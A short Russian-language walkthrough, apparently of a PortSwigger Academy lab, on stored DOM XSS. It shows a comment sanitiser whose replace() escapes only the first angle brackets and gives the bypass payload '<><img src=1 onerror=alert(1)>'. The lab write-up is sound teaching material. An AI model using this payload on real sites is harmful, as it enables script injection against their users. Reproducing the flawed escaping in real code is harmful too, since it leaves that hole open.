зайдем на случайный пост

оставим тестовый комментарий
найдем, что при отправке сообщения используется скрипт `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`
```
GET /post?postId=3
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/10.%20Stored%20DOM%20XSS/pics%20for%20walktrough/1.png)
найдем его в запросах и посмотрим что там внутри
```
GET /resources/js/loadCommentsWithVulnerableEscapeHtml.js
```
```
 function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
```
видим метод `replace` который служит IOC'ом для XSS уязвимости
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/10.%20Stored%20DOM%20XSS/pics%20for%20walktrough/2.png)

так как по логике, он меняет только первое вхождение <> то используем следующий пэйлоад
```
<><img src=1 onerror=alert(1)>
```
чтобы он превратился в `&lt&gt<img src=1 onerror=alert(1)>`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/10.%20Stored%20DOM%20XSS/pics%20for%20walktrough/3.png)

и при повторном обращении к странице появлятся наш XSS скрипт с уведомлением об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/10.%20Stored%20DOM%20XSS/pics%20for%20walktrough/4.png)
